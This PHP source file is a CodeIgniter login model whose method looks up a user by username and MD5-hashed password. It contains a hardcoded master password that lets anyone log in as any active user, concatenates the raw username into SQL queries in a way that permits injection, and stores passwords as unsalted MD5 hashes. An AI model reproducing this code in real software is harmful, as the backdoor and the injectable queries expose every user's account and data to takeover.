<?php
class Mlogin extends CI_Model {

	public function __construct () 
	{
		parent::__construct();
	}
	
	
	public function cekuser($username,$pass)
	{
		$sql = "";
		if ($pass == "developer!@#;") {
			# code...
			$sql = "SELECT a.*
					FROM mr_user a 		
					WHERE a.username = '".$username."' 
					AND a.status='1' 
					ORDER BY a.id ASC
					LIMIT 1
			";						
		}
		else {
			# code...
			$secured_pass = md5($pass);
			$sql = "SELECT a.*
					FROM mr_user a 		
					WHERE a.username = '".$username."' 
					AND a.password = '$secured_pass'
					AND a.status='1' 
					ORDER BY a.id ASC
					LIMIT 1
			";			
		}

		$query = $this->db->query($sql);
		if($query->num_rows() == 1)
		{
			return $query->result();
		}
		else
		{
			return 0;
		}
		return $query;
	}	
}